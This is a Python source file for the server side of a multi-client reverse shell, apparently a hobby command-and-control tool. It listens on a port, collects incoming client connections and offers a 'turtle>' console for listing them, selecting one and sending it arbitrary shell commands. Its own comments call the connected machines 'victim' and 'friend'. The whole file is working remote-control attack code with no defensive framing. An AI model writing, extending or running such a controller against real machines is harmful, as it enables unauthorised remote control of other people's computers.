import socket
import sys
import threading
import time
from queue import Queue
NUMBER_THREAD=2
job_number=[1,2]
queue=Queue()
all_connection=[]
all_adreess=[]
##creating socket(for connecting two computer)
def create_socket():
    try:
        global host
        global port
        global s
        host= ""
        port= 65187
        s=socket.socket()
    except socket.error as msg:
        print("socket creation error"+str(msg))


###Binding and listning the connection
def binding_socket():
    try:
        global host
        global port
        global s
        print("binding the port"+str(port))
        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("socket binding error"+str(msg)+"\n"+"retrying...")
        binding_socket()

#handling connection between multiple client
#closing all previous connection when server.py restarted
def accepting_connection():
    for c in all_connection:
        s.close()
    del all_connection[:]
    del all_adreess[:]

    while True:
        try:
            conn,address=s.accept()
            s.setblocking(1)  #prvent timeout
            all_connection.append(conn)
            all_adreess.append(address)
            print("connection has been establish"+address[0])
        except:
            print('error accepting connection')

#2nd thread function 1)see all client 2)select the client 3)send command yo the selected client
#interactive prompt for sending command
#turtle>list
# 0 friend-A port
# 1 friend-b port
# 2 friend-c port
#turtle>select 1
def start_turtle():

    while True:
        cmd = input('turtle>')
        if cmd == 'list':
            list_connection()

        elif 'select'in cmd:
            conn=get_target(cmd)
            if conn is not None:
                send_target_command(conn)
            else:
                print("Command is not recognize")

#display all active connection with client
def list_connection():
    result=''
    for i,conn in enumerate(all_connection):
        try:
            conn.send(str.encode(" "))
            conn.recv(201480)
        except:
            del all_connection[i]
            del all_adreess[i]
            continue
        result=str(i)+"  "+str(all_adreess[i][0])+"  "+str(all_adreess[i][1])+"\n"
        print("--Client--"+"\n"+result)
#selecting the target
def get_target(cmd):
    try:
        target=cmd.replace('select',"")#target id
        target=int(target)
        conn=all_connection[target]
        print("you are now connected to"+str(all_adreess[target][0]))
        print(str(all_adreess[target][0])+">",end="")
        return conn

    except:
        print("selection not valid")
        return None

#send command to the multiple client or victim
def send_target_command(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_responce = str(conn.recv(20480), "utf-8")
                print(client_responce, end=" ")

        except:
            print("error sending command")
            break

#create worker thread
def create_worker():
    for _ in range(NUMBER_THREAD):
        t=threading.Thread(target=work)
        t.daemon=True
        t.start()
#do the job that is in the queue(handle connection,send command)
def work():
    while True:
        x=queue.get()
        if x==1:
            create_socket()
            binding_socket()
            accepting_connection()
        if x==2:
            start_turtle()
        queue.task_done()


def create_job():
    for x in job_number:
        queue.put(x)
    queue.join()

create_worker()
create_job()


